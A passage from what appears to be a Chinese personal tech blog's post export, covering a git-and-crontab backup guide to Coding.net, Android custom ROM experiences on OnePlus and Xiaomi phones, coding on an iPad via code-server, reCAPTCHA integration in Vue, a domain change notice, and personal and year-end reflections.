<p>输入 <a href="mailto:&#x67;&#105;&#116;&#x40;&#103;&#x69;&#x74;&#46;&#99;&#x6f;&#100;&#x69;&#110;&#103;&#x2e;&#110;&#101;&#116;">&#x67;&#105;&#116;&#x40;&#103;&#x69;&#x74;&#46;&#99;&#x6f;&#100;&#x69;&#110;&#103;&#x2e;&#110;&#101;&#116;</a> 如果返回</p>
<pre><code>Coding.net Tips : [Hello! You&#39;ve connected to Coding.net via SSH. This is a deploy key.
</code></pre>
<p>就成功了，首次连接需要接受她的原谅，她会问你：</p>
<pre><code>Are you sure you want to continue connecting (yes/no)? 
</code></pre>
<p>你愿意接受我的原谅吗？输入 yes 即可。</p>
<p>否则返回检查步骤是否出错。</p>
<p>将 YourName 与 YourEmail 替换后执行</p>
<pre><code>git config --global user.name &quot;YourName&quot;
git config --global user.email &quot;YourEmail&quot;
</code></pre>
<p>接着 cd 到文件目录执行(目录有文件请先备份，出了差错…)</p>
<pre><code>git init
</code></pre>
<p>大概会返回</p>
<pre><code>Initialized empty Git repository in &#39;文件目录&#39;/.git
</code></pre>
<p><img data-src="/images/Date/2017/06/2603822132.png" alt="git.png" title="git.png"></p>
<p>然后到这里复制到类似 <a href="mailto:&#103;&#x69;&#x74;&#64;&#x67;&#x69;&#116;&#46;&#99;&#x6f;&#x64;&#105;&#x6e;&#103;&#x2e;&#110;&#101;&#x74;">&#103;&#x69;&#x74;&#64;&#x67;&#x69;&#116;&#46;&#99;&#x6f;&#x64;&#105;&#x6e;&#103;&#x2e;&#110;&#101;&#x74;</a>:xxx/How-to-Cross-Dressing.git 的东西，将你复制到的与下面 <a href="mailto:&#103;&#x69;&#x74;&#x40;&#103;&#x69;&#x74;&#x2e;&#99;&#111;&#x64;&#x69;&#x6e;&#x67;&#x2e;&#110;&#101;&#116;">&#103;&#x69;&#x74;&#x40;&#103;&#x69;&#x74;&#x2e;&#99;&#111;&#x64;&#x69;&#x6e;&#x67;&#x2e;&#110;&#101;&#116;</a>:xxx/How-to-Cross-Dressing.git 替换</p>
<p>执行</p>
<pre><code>git remote add origin git@git.coding.net:xxx/How-to-Cross-Dressing.git
</code></pre>
<p>首次备份，执行</p>
<pre><code>git add .
git commit -m &quot;First Push.&quot;
git push origin master
</code></pre>
<p>返回</p>
<pre><code>Counting objects: 3, done.
Writing objects: 100% (3/3), 231 bytes, done.
Total 3 (delta 0), reused 0 (delta 0)
To git@git.coding.net:xxx/How-to-Cross-Dressing.git
 * [new branch]      master -&gt; master
</code></pre>
<p><img data-src="/images/Date/2017/06/2680782095.png" alt="refresh.png" title="refresh.png"></p>
<p>回到 Coding 刷新后即可看到新提交。</p>
<blockquote>
<p>后戏</p>
</blockquote>
<p>你需要一个 Crontab 来支持他运作。 &gt; <a href="http://lmgtfy.com/?q=%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85%20Crontab">如何宀女装</a></p>
<p>创建一个 sh 文件到任意位置，如 /home/a.sh 写入</p>
<pre><code>cd 之前的git所在目录
git add -A .
git commit -m &quot;$(date)&quot;
git push origin master
</code></pre>
<p>输入 crontab -e ，写入</p>
<pre><code>*/5 * * * * sh /home/a.sh
</code></pre>
<p>此处 /5 为每5分钟执行一次，你也可以按照crontab标准更改。</p>
<p>大功告成！</p>
<p>再次提醒。<br>江来出了啥差错，我可是付不起泽任的，识得唔识得！</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>果果</tag>
      </tags>
  </entry>
  <entry>
    <title>【搞机篇】一加 3T 上更好用的“氢”ROM</title>
    <url>/archives/better-rom-on-oneplus3t.html</url>
    <content><![CDATA[<p>自从入手一加 3T 以后，感觉手机的充电频率变得越来越高，有时候甚至一天需要进行三四次充电。如下图就是我以前用氢氧官方系统时的耗电情况。不仅崩得不行，还莫名其妙的卡。</p>
<span id="more"></span>

<p> <a href="/images/Date/2018/03/1.jpg"><img data-src="/images/Date/2018/03/1-576x1024.jpg"></a> 之前有试过刷入 <a href="https://www.flyme.cn/firmwarelist-107.html">Flyme</a> ，后来发现它也是用氢OS做底层。虽然废了米的部分功能还不错，但是该尿崩的还是继续尿崩，给你5小时，把这台手机的电都给耗光。 偶然看了一下酷安，发现类似情况的也有很多，当然也有推荐刷其他类似 AOSPExtended、LineageOS 之类的第三方 ROM 的，但是有一些氢氧特有的功能我也不大想放弃，比如说“抬手亮屏”、“锁屏下长按 Home 键进入支付界面”、“颜色模式” 之类的，爽到。于是就有人推荐了 <a href="http://www.oneplusbbs.com/home.php?mod=space&uid=1278406">DKRom</a> ，一开始看酷安里面的大佬都 “DKDK” 的说，我找了大半天没找着，后来再仔细翻找才知道是一加社区里面的一位大佬，<a href="http://www.oneplusbbs.com/home.php?mod=space&uid=1278406&do=thread&view=me&from=space&type=thread">你可以在这里看到这位大佬发布的官改氢 OS</a>。 这个官改 ROM 的特色就是多了更多的自定义功能，你可以在上面自定义滑动动画，其他之类的特色玩意儿，对于我这种弱鸡还是挺实用的，刷完了以后微信的指纹支付也都还在。 <a href="/images/Date/2018/03/Screenshot_20180331-140029.jpg"><img data-src="/images/Date/2018/03/Screenshot_20180331-140029-576x1024.jpg"></a> 你可以在上面自定义字体，刷入 DKROM 提供的字体补丁包后便可选择字体进行使用，十分方便。 <a href="/images/Date/2018/03/Screenshot_20180331-140047.jpg"><img data-src="/images/Date/2018/03/Screenshot_20180331-140047-576x1024.jpg"></a> 当然，Dk设置 - 性能 中也提供性能模式的选择，因为平时要保持低能耗的缘故，我也选择了省电模式作为日常使用，总体来说效果还不错，晒上我最近的耗电情况图 <a href="/images/Date/2018/03/Screenshot_20180331-093116.jpg"><img data-src="/images/Date/2018/03/Screenshot_20180331-093116-576x1024.jpg"></a> 虽然说看起来一般，但也起码比官方的氢氧好了许多，这么用起来还是爽到的。 当然，为了让 ROM 能够持续更新，也为了让作者更加有动力继续改，里面还是内置了一些软件，如果你看着不爽，可以用钛备份将其删除。 <a href="/images/Date/2018/03/photo_2018-03-18_07-57-56.jpg"><img data-src="/images/Date/2018/03/photo_2018-03-18_07-57-56-576x1024.jpg"></a> DKROM 在氢3.5前默认使用 2.82 版本的 supersu 来充当授权管理，因为好像上 O 以后官方的氢氧就强制要求全盘加密，为了 dual boot patcher 能正常地使用，我并没有上奥利奥，不过似乎 O 以后的 DKROM 官改就采用 magisk 来做授权管理了，苯辣鸡目前还没找到将 supersu 换成 magisk 的方法（ 如果你想拥有第三方 ROM 更多的自定义功能，却又不想抛弃氢氧OS的特色功能，不妨试一下 DKROM 这个官改rom，可能这玩意儿也适合你。   爽到。</p>
]]></content>
      <categories>
        <category>搞机篇</category>
      </categories>
  </entry>
  <entry>
    <title>【搞机篇】小米4 Android P 一个月上手体验</title>
    <url>/archives/cancro-p.html</url>
    <content><![CDATA[<p>之前在坐和那里加了50块钱用魅蓝note2换了一台小米4想着刷机用，长期使用中大屏手机用户第一次上手感觉很小巧，十分适合我。唯一的不足就是不支持联通4G，甚至不支持联通3G，这也成为我抛弃它作为上学主力机的理由。 </p>
<span id="more"></span>

<p>先上一波米4美照（辣鸡相机辣鸡拍照水平辣鸡成像） <img data-src="/images/Date/2018/10/mi4-1024x768.jpg"> Android P 使用的是 XDA 论坛上的 <a href="https://forum.xda-developers.com/xiaomi-mi-3/development/9-0-aosp-pie-t3828325">Aosp Pie [9.0.0][3.10][12-Aug][Mi3/Mi4/Mi4 LTE]</a> by <a href="https://forum.xda-developers.com/member.php?u=5579787">vasishath</a>，十分流畅，除了相机有莫名其妙的 Bug 以外，其他意外的不错，具备当一台备用机的要求。 需要注意的是，刷入这个 ROM 需要使用特制的 TWRP，以及 GAPPS。同时在刷入 ROM 后不能急着刷入 GAPPS ，要先进入一遍系统再返回 TWRP 继续刷入，否则你将无法使用系统。 怎么不正常法？ 你将无法正常使用手机电容主页和菜单按键，虽然这都可以通过电脑 adb 来解决，但多一事不如少一事嘛（ 在刷入这个 ROM 之前，你需要备份原 ROM 的 PackageInstaller ，并且在刷入 GAPPS 后将 GAPPS 的 GooglePackageInstaller 从系统 /system/priv-app 文件夹中删掉，并且重新将 PackageInstaller 放回去。如果你没有保留，你也可以在下方下载 PackageInstaller 后放入 /system/priv-app 。 怎么放？解压后用电脑扔 TWRP 里，或者你提前下好解压好，用 TWRP 的 File Mangaer 放入 /system/priv-app 里。 对就是下图这个位置。 <img data-src="/images/Date/2018/10/photo_2018-10-14_17-25-26-576x1024.jpg">     PS: 如果你不这么操作的话，你将只能安装从“下载管理内容”安装的软件，从其他程序打开 APK 文件，软件包安装程序将会 FC 。 系统 美 截图 [caption id=”attachment_80” align=”alignnone” width=”576”]<img data-src="/images/Date/2018/10/photo_2018-10-14_17-26-57-576x1024.jpg"> 锁屏，正在使用 Smartlock 人脸解锁[/caption]   [caption id=”attachment_81” align=”alignnone” width=”576”]<img data-src="/images/Date/2018/10/photo_2018-10-14_17-28-08-576x1024.jpg"> 多任务[/caption] <img data-src="/images/Date/2018/10/photo_2018-10-14_17-30-55-576x1024.jpg"> [caption id=”attachment_83” align=”alignnone” width=”576”]<img data-src="/images/Date/2018/10/photo_2018-10-14_17-30-58-576x1024.jpg"> 通知栏[/caption] [caption id=”attachment_84” align=”alignnone” width=”576”]<img data-src="/images/Date/2018/10/photo_2018-10-14_17-31-01-576x1024.jpg"> 通知推送[/caption] [caption id=”attachment_85” align=”alignnone” width=”576”]<img data-src="/images/Date/2018/10/photo_2018-10-14_17-30-49-576x1024.jpg"> 设置[/caption] [caption id=”attachment_86” align=”alignnone” width=”576”]<img data-src="/images/Date/2018/10/photo_2018-10-14_17-30-52-576x1024.jpg"> 电量管理[/caption] 不同于其他 Android P 的默认设置，这个 ROM 包将系统界面默认的圆角给调小了，对我这种圆角强迫症用户来说，也让整个界面变得更佳的美观。 该 ROM 并不能使用系统自带的相机功能，但可以在 Telegram X 中使用相机，虽然说拍出来的照片特别的大，而且还模糊。如果也有小米4正在吃灰，那这个 ROM 除了没法拍照、没法使用耳机接口 以外其他还挺合适的（不过我听说好像可以通过刷入 magisk 来解决来着 这个 ROM 也能正常使用 <a href="https://github.com/Trumeet/MiPushFramework">小米推送服务框架 </a>进行推送，并且效果还不错，可惜时候没到没有样张（雾 <img data-src="/images/Date/2018/10/photo_2018-10-14_17-40-06-576x1024.jpg"> <img data-src="/images/Date/2018/10/photo_2018-10-14_17-40-10-576x1024.jpg">   推荐指数：⭐️⭐️⭐️⭐️ 就酱，有再补充。 参考链接汇总： PackageInstaller 下载链接： <a href="/images/Date/2018/10/PackageInstaller.zip">PackageInstaller</a> XDA 论坛链接：<a href="https://forum.xda-developers.com/xiaomi-mi-3/development/9-0-aosp-pie-t3828325">Aosp Pie [9.0.0][3.10][12-Aug][Mi3/Mi4/Mi4 LTE]</a> （具体 ROM/GAPPS/TWRP 链接请前往2楼查看）</p>
]]></content>
      <categories>
        <category>搞机篇</category>
      </categories>
  </entry>
  <entry>
    <title>来！试试用 iPad 来写代码吧！</title>
    <url>/archives/code-at-iPad.html</url>
    <content><![CDATA[<p>买了 iPad 以后，就感觉破破 XPS 老吉尔重了，出门还是喜欢带一个 iPad + 某宝20块钱买的蓝牙键盘码码字。但由于上课还是得撸码写写 C 或者 Python 什么的，XPS 还是得带，于是在网络上寻找有没有可以用 iPad 来写代码，最好能调试运行的方案。</p>
<span id="more"></span>

<h1 id="方案一：Repl-it"><a href="#方案一：Repl-it" class="headerlink" title="方案一：Repl.it"></a>方案一：Repl.it</h1><p>地址：<a href="https://repl.it/">Repl.it</a></p>
<p>这个方案是 <a href="https://elepover.com/">@Elepover</a> 推荐给我的。作为一个开箱即用的站点，可以直接克隆 GitHub 上的仓库使用，或者直接开启一个空项目进行代码，而且支持几乎所有的主流编程语言。更重要的是，它还提供 Shell ，这个 Shell 虽然不提供 root 权限，但是是支持连接到互联网的。</p>
<p><img data-src="/images/Article/Code-At-iPad/replit.png" alt="replit.png"></p>
<p>甚至你还可以进行调试，不过调试功能目前仅支持 Python，而且不知道为啥好像没法正常使用。</p>
<h1 id="方案二：自建-Code-Server"><a href="#方案二：自建-Code-Server" class="headerlink" title="方案二：自建 Code Server"></a>方案二：自建 Code Server</h1><p>这也是我正在使用的方案，其一是界面就是自己熟悉的 Visual Studio Code 的界面，其二就是部署在自己服务器上，有最高权限的情况下，自己爱咋装软件咋装。</p>
<h2 id="使用-Docker-Compose"><a href="#使用-Docker-Compose" class="headerlink" title="使用 Docker-Compose"></a>使用 Docker-Compose</h2><p>Do，必须 Do，有 Docker 的怎么能不用 Docker 呢</p>
<p>参考文档：<a href="https://hub.docker.com/r/linuxserver/code-server">linuxserver/code-server</a></p>
<p>此处注意，为了方便之后不用我手动安装 Python 软件包，我在 environment 处加了一行</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">- DOCKER_MODS=linuxserver/mods:code-server-python3</span><br></pre></td></tr></table></figure>

<p>参考资料：<a href="https://github.com/linuxserver">linuxserver</a>/<strong><a href="https://github.com/linuxserver/docker-mods">docker-mods</a></strong></p>
<h2 id="配置-iPad"><a href="#配置-iPad" class="headerlink" title="配置 iPad"></a>配置 iPad</h2><p>这里我使用的软件是 ‎<a href="https://apps.apple.com/cn/app/servediter-for-code-server/id1504491325?l=en">Servediter for code-server</a> ，其实也可以使用浏览器，不过这个配置好点开就可以用了，还是比较方便的。</p>
<h2 id="配置-Python"><a href="#配置-Python" class="headerlink" title="配置 Python"></a>配置 Python</h2><p>此处有一个巨坑，通过 Marketplace 安装的 Extensions 似乎无法正常使用，之前一直以为是 Code Server 的问题，直到昨天在 <a href="https://t.me/jqqqqqqqqqq">@jqqqqqqqqqq</a> 的提醒与帮助下，有这么一个 issue</p>
<p><a href="https://github.com/cdr/code-server/issues/1837">Python extension fails to activate · Issue #1837 · cdr/code-server</a></p>
<p>在通过 vsix 安装 <a href="https://github.com/microsoft/vscode-python/releases/tag/2020.5.86806">https://github.com/microsoft/vscode-python/releases/tag/2020.5.86806</a> 后问题得到解决，然后再创建 launch.json 后写入</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Use IntelliSense to learn about possible attributes.</span></span><br><span class="line">    <span class="comment">// Hover to view descriptions of existing attributes.</span></span><br><span class="line">    <span class="comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;configurations&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Python: Current File&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;python&quot;</span>,</span><br><span class="line">        <span class="string">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">        <span class="string">&quot;program&quot;</span>: <span class="string">&quot;$&#123;file&#125;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;console&quot;</span>: <span class="string">&quot;integratedTerminal&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>记得先保存文件，默认目录会放在 /config/workspace。</p>
<p>在 Run 选项卡中选择 Python: Current File，点击运行</p>
<p><img data-src="/images/Article/Code-At-iPad/Python-Debug.png" alt="python.png"></p>
<p>成了！</p>
<p>接下来的操作就和在</p>
<h2 id="配置-C-C"><a href="#配置-C-C" class="headerlink" title="配置 C/C++"></a>配置 C/C++</h2><p>这里也有一个巨坑。同 Python 一样，通过 Marketplace 安装的 Extensions 也会导致出现奇奇怪怪的错误，能用，只能用一点点。</p>
<p>参考资料：<a href="https://nekiglacier.top/2020/10/21/CoderServerDocker%E6%90%AD%E5%BB%BAC%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83/">CodeServer搭建C++编译环境 | NekiGlacier</a></p>
<p>具体搭建环境的方法上述文章已经写了，这里就不赘述了。</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>最后，经过这么一两个月的来回横跳，终于达成了在 iPad 上写代码的愿望，但是也放假了。。</p>
<p>然后最近快要过年了，我先给大家拜个早年（不是</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>iPad</tag>
      </tags>
  </entry>
  <entry>
    <title>【域名更改】果果家的博客域名即将更换</title>
    <url>/archives/domain-changed.html</url>
    <content><![CDATA[<p>由于部分原因，可能是觉得原来的域名太长，也有可能是因为自己真的是穷，穷到已经没法继续续费 .com 域名，经过了持久的简单的思考以后，现决定将原域名 imguoguo.com 废弃，更换为 guo.moe ，同时将服务器迁移，原域名在域名到期前将 301 跳转到该域名上。 同时上 HSTS 坑死接盘侠 各位加了友链的 dalao 们可以将友链域名换为 <a href="https://guo.moe/">https://guo.moe/</a> ，其他东西应该没啥变化 就酱</p>
]]></content>
      <categories>
        <category>无聊吐吐槽</category>
      </categories>
  </entry>
  <entry>
    <title>【小记】体育测试那些小感动</title>
    <url>/archives/e3-80-90-e5-b0-8f-e8-ae-b0-e3-80-91-e4-bd-93-e8-82-b2-e6-b5-8b-e8-af-95-e9-82-a3-e4-ba-9b-e5-b0-8f-e6-84-9f-e5-8a-a8.html</url>
    <content><![CDATA[<p>我的身体素质其实并不得行，算是肥胖的那一类，在班上体育成绩也十分落后，算得上是班上的倒数第一。 前几天刚刚测试了跳远，然而一直跳不过及格线，登记成绩的同学看了看，就笑着说，算了，让你及格吧。 然后我以前左手右手手腕都受过一点小伤，再加上吃太多，导致我的引体向上就一直是 0，那当然就是不及格的。 刚准备进行 1000 米测试，本来已经做好全部 0 蛋的打算了，开始跑的时候打算就先冲，后面再慢慢减速跑完就好。奇怪的是，刚开始跑竟然一跑就跑到了第三个，最后已经减速到快要走路的程度了，也跑到了第10个左右。最后跑完的时候，发现后面还有一群人集在一起跑，边跑还边喊着班级的口号。老师看起来不太开心。</p>
<blockquote>
<p>你们这群人全部不及格</p>
</blockquote>
<p>后面的同学笑着拍拍肩。</p>
<blockquote>
<p>没事，大伙儿陪你不及格</p>
</blockquote>
]]></content>
      <categories>
        <category>碎碎念</category>
      </categories>
  </entry>
  <entry>
    <title>再见 2019，你好 2020</title>
    <url>/archives/goodbye-2019-hello-2020.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>就这样，2019 转眼离去，2020 随之而来。</p>
<p>2019，改变得不多，又改变得太多。</p>
<span id="more"></span>

<h1 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h1><h2 id="从高中，步入大学"><a href="#从高中，步入大学" class="headerlink" title="从高中，步入大学"></a>从高中，步入大学</h2><h3 id="高中"><a href="#高中" class="headerlink" title="高中"></a>高中</h3><p>终于，结束了 12 年的教育，中小学生涯也结束了。有些开心，又有些彷徨。</p>
<p>2019 上半年，只有苦。为了冲刺大学拼搏一年的那种苦，啥也没法想，就只能去不停地做题做笔记。</p>
<p>6 月 8 日高考考完出来，当时整个就懵了</p>
<p>就没了？</p>
<p>但事实上考完两天就缓过来了，好像没啥事发生过。</p>
<p>实际上，当时拿到了成绩单，也有点懵，我该怎么办？该怎么选择</p>
<h3 id="大学"><a href="#大学" class="headerlink" title="大学"></a>大学</h3><p>上了大学，不得不说肯定是有一些后悔，但又不那么后悔。</p>
<p>看到朋友一个个都上了985、211，不得不说有点懊恼，别人一个两个都上了知名的大学，我最终还只能混个二本。</p>
<p>但在大学里，认识了一位人很不错的师兄，也接触到了许多在其他地方无法接触到的，或者说没有能力接触到的东西，所以又不那么后悔了。</p>
<p>还有寝室里的几个沙雕朋友，让我大学生活也感到十分快乐。</p>
<h3 id="加入工作室"><a href="#加入工作室" class="headerlink" title="加入工作室"></a>加入工作室</h3><p>在学校加入了学校的工作室，认识了很多伙伴，在里面就感觉很开心）</p>
<h2 id="伙伴"><a href="#伙伴" class="headerlink" title="伙伴"></a>伙伴</h2><p>高中到大学，认识了不少伙伴，也与一些伙伴逐渐失去了联系。</p>
<h3 id="U2-酱（U2FsdGVkX1）"><a href="#U2-酱（U2FsdGVkX1）" class="headerlink" title="U2 酱（U2FsdGVkX1）"></a>U2 酱（U2FsdGVkX1）</h3><p>从我初三毕业认识的 U2，不得不说，U2 是我进入“编程殿堂”的导师。从我做的第一个粗糙“果式代码”的单文件 PHP Telegram Bot ，一路走到现在，<del>一旦我要被气哭了</del>，总是第一时间过来帮助我。</p>
<h3 id="奶冰（Milkice）"><a href="#奶冰（Milkice）" class="headerlink" title="奶冰（Milkice）"></a>奶冰（Milkice）</h3><p>在包括奶冰在内的“小团体”里，总是有话就聊，倾吐自己的真实心声，在这个小团体里总是感觉十分温暖，然后还有一些小破事也会找奶冰交流交流啦</p>
<h3 id="E猪猪（Elepover）"><a href="#E猪猪（Elepover）" class="headerlink" title="E猪猪（Elepover）"></a>E猪猪（Elepover）</h3><p>在高中的时期，有学习上的问题的话，都会问他，在高中向高考冲刺的时间里帮了我不少</p>
<h3 id="晓丽-小浩（ZoharWang）"><a href="#晓丽-小浩（ZoharWang）" class="headerlink" title="晓丽 小浩（ZoharWang）"></a><del>晓丽</del> 小浩（ZoharWang）</h3><p><del>博客 CDN 都是蹭小浩的</del></p>
<p>说实话，今年和小浩在私底下的交流少了，大多都是在群里交流得多，不过还是很欢快的嘛</p>
<h3 id="雄哥（TARI-TARI）"><a href="#雄哥（TARI-TARI）" class="headerlink" title="雄哥（TARI TARI）"></a>雄哥（TARI TARI）</h3><p>雄哥在大学生涯帮助过我不少事，从物质上的资助，到学习上的辅导。实名感谢一波雄哥</p>
<h1 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h1><h2 id="Programming"><a href="#Programming" class="headerlink" title="Programming"></a>Programming</h2><p>在暑假期间，在 U2 的协助下，开了一个坑 <a href="https://github.com/imguoguo/java-telegram-bot">https://github.com/imguoguo/java-telegram-bot</a> ，结果就没有后文了。</p>
<p>然后还做了一个破面板，但因为技术原因无法继续开展然后也弃坑了</p>
<p>做了<del>工作室目前都不怎么想用的</del>果家直播间</p>
<p>写了一个爬答案的玩意</p>
<p>初学了 React, Typescript, Vue, Laravel 和微信小程序</p>
<p>本来想着要学安卓开发的，后来也咕咕咕了</p>
<h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p><del>呐，二次元浓度爆表了呐呐呐</del></p>
<p>2019 年就这么一下过了，还没反应过来，2020 年又会遇到什么样的新鲜事呢</p>
<p>匿了匿了，有点不舒服</p>
]]></content>
      <categories>
        <category>无聊碎碎念</category>
      </categories>
  </entry>
  <entry>
    <title>记录在使用 Google Recaptcha 中遇到的一些坑</title>
    <url>/archives/google-recaptcha.html</url>
    <content><![CDATA[<p>因为在某一个项目中需要使用验证码（登陆注册之类的），又不想自己摸（太麻烦啦），于是就想着用 Google reCAPTCHA，想着这样就可以摸鱼之类的。（在此处 十分感谢一位神秘网友的支持，提高了我90%的办事效率。（原本只有10%这样子））</p>
<span id="more"></span>

<p>首先，你需要确定自己要用哪种方式来验证</p>
<p>Google reCAPTCHA 目前有两种验证方式，其中 v2 又有三种方式。</p>
<p>先说说 v3 ，这玩意说高级是挺高级，他验证所用的方式是通过用户的ip，浏览器啥的balabala的玩意给你一个评分，然后需要开发人员根据评分的大小来判断其是否是机器人，从而进行进一步的操作。举个例子，如果评分小于 0.5 ，基本就可以判定其是机器人，然后需要给用户进行电子邮箱的验证、手机短信验证码的验证等等。这种方法感觉让开发人员要做更多的工作，而且在使用的时候右下角还会有一个悬浮窗自豪地对世界说：</p>
<p>本网站 由 <strong>reCAPTCHA</strong> 提供保护</p>
<p><img data-src="/images/Date/2019/07/image.png"></p>
<p>当然你是谷粉的话这不算什么，可能还觉得有点好看，但我在使用的时候这玩意破坏了样式，然后让整个网站布局变得莫名其妙（</p>
<p>所以果果在这里果断推荐 v2。v2 的话分为复选框形式和一个“不可见”形式。按照我不负责任的推测，我估摸不可见应该是在点击登录按钮的时候进行验证并弹出一个验证框（。？）所谓所见即所得，在实际的开发过程中，果果选用的是复选框形式。</p>
<h3 id="申请-API-Key"><a href="#申请-API-Key" class="headerlink" title="申请 API Key"></a>申请 API Key</h3><p>你可以在 <a href="https://www.google.com/recaptcha/admin/create">https://www.google.com/recaptcha/admin/create</a> 申请获得。填写 信息确保准确无误后，阅读并勾选 <strong>接受“reCAPTCHA 服务条款”</strong> 并提交。（由于是进行本地测试，所以域名你也可以填 localhost）</p>
<p><img data-src="/images/Date/2019/07/image-2-1024x530.png"></p>
<p>reCAPTCHA 注册成功界面</p>
<p>这里 reCAPTCHA 的原理是 先在浏览器端进行验证，验证成功后会返回一个token， 然后你就可以拿着这个 token 去请求 google reCAPTCHA 服务器，他就会给你返回成功或者失败。实际的东西在文档里写得很清楚，这里就简单提一下</p>
<blockquote>
<p>编者注</p>
<p>由于 Google reCAPTCHA 服务器在国内无法访问，实际开发时建议使用 <a href="http://www.recaptcha.net/">www.recaptcha.net</a> 替换。</p>
</blockquote>
<h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><p>果果在大佬的指点下，使用了 Vue (WebPack) 进行前端的开发（然后后面就疯狂推荐 react…）</p>
<p>在 Vue UI 安装 vue-recaptcha 依赖后，疯狂引入一波。</p>
<p>由于果果这里只有部分页面需要引入，然后又不想全局引入，于是用了一种脏方法来引入外部 js（如果有更好的方法欢迎大家留言QAQ，我也觉得这种方法真的好蠢（</p>
<p>let recaptcha = document.createElement(“script”);</p>
<p>recaptcha.src = “<a href="https://www.recaptcha.net/recaptcha/api.js?onload=vueRecaptchaApiLoaded&amp;render=explicit&quot;">https://www.recaptcha.net/recaptcha/api.js?onload=vueRecaptchaApiLoaded&amp;render=explicit&quot;</a>;</p>
<p>recaptcha.async = true;</p>
<p>recaptcha.defer = true;</p>
<p>document.body.appendChild(recaptcha);</p>
<p>并在所需页面写入</p>
<p><code>import VueRecaptcha from &#39;vue-recaptcha&#39;;</code></p>
<p><code>components: &#123; VueRecaptcha &#125;,</code></p>
<p><code>&lt;vue-recaptcha ref=&quot;recaptcha&quot; :loadRecaptchaScript=&quot;true&quot; @verify=&quot;recaptchaVerified&quot; @expired=&quot;recaptchaExpired&quot; sitekey=&quot;之前申请的 client key&quot;&gt;&lt;/vue-recaptcha&gt;</code></p>
<p>@verify 那一块就是验证成功的回调函数啦，@expired 同理。一般来说，@verify 用来存那个 Token ，@expired 就 this.$refs.recaptcha.reset(); 一键安排重置。</p>
<p>然后注意在 data 开一个空变量用于存储 reCAPTCHA 返回的 TOKEN。</p>
<p>在所需部分 写下 HTML 元素。</p>
<p><img data-src="/images/Date/2019/07/image-1.png"></p>
<p>然后这个验证还是不跟着布局走，没办法， 那向左偏就向左偏吧（</p>
<p>在用户点击登录的时候，记得判断一下 token 是否为空，为空的话让他去验证一下就行啦~</p>
<p>在发送登陆请求的时候，记得把 reCAPTCHA 返回的 token 结果一并提交上去哦（否则这次的人机身份验证将毫无意义（严肃））</p>
<h4 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h4><p>后端的操作其实就很简单了，直接向 reCAPTCHA 的 API 发送一个 post 请求，secret上带上刚才申请的 server key，response 就发送刚刚前端发来的 token，然后就会获得下面的一串神秘字符（其实这些玩意也是文档就有，自己查一下就行了）</p>
<p><img data-src="/images/Date/2019/07/image-3-1024x511.png"></p>
<p>总的来说，reCAPTCHA 作为一款验证系统，感觉还是挺友好的， （v3除外（来自果果的怨念） 省了很多做验证码的事，也省了被研究如何破解的心思</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
  </entry>
  <entry>
    <title>MEIZU POP 2 使用体验</title>
    <url>/archives/meizu-pop-2-experiment.html</url>
    <content><![CDATA[<p>魅族 POP 2 这款耳机，是我拿到的第一款分体式蓝牙耳机，更是我的第一款蓝牙耳机。</p>
<span id="more"></span>

<p>在两个月前，作为一大贫穷势力，一直使用着淘宝40块钱买的AKG耳塞。在此之前，就已经有了购买分体式蓝牙耳机的想法，但一直在犹豫购买哪款。魅族作为曾经的一个“声学小厂”，便自然地进入我的清单中。</p>
<p><img data-src="/images/Date/2019/10/photo_2019-10-07_09-09-31-1024x768.jpg"></p>
<p>盒盖外观</p>
<p><img data-src="/images/Date/2019/10/photo_2019-10-07_09-10-43-1024x768.jpg"></p>
<p>开盖外观</p>
<p><img data-src="/images/Date/2019/10/photo_2019-10-07_09-19-47-1024x768.jpg"></p>
<p>后部外观</p>
<p>外观棱角分明，毕竟不像 AirPods 那样圆润，塞进裤子里会感觉到有一点搁腿。</p>
<p>机身后部有一小圆按钮，按下，前方电量指示灯会亮起，然后就能看到电量大小这样子。</p>
<p>说实话，这玩意第一代的时候倒是挺吸引人的，拥有无线充电功能，随放随充。（当提到无线充电功能的时候，总有人会说这个东西是个鸡肋，但我就是挺喜欢这种丢在一旁就自己充电的畅快感，平时总不用管它去充电）但奇怪的是，第二代砍了，究竟为什么这么做，也许是为了节省成本？</p>
<p>取出双侧耳机，耳机外侧呼吸灯常亮闪烁，打开手机进行配对。在使用 Flyme 系统的手机上，还会显示官方配件字样。</p>
<p><img data-src="/images/Date/2019/10/photo_2019-10-07_09-27-49-1024x768.jpg"></p>
<p><img data-src="/images/Date/2019/10/Snipaste_2019-10-07_09-28-42.png"></p>
<p>刚开始连上的时候，第一次使用蓝牙耳机的我感觉延迟极大，就是那种收到通知以后手机先响耳机后响的那种奇怪的感觉。后来才发现，这玩意不支持 APT-X 协议，只支持 SBC 和 AAC 协议。我也不知道啥协议协议的，反正就是有那么点延迟就对了。</p>
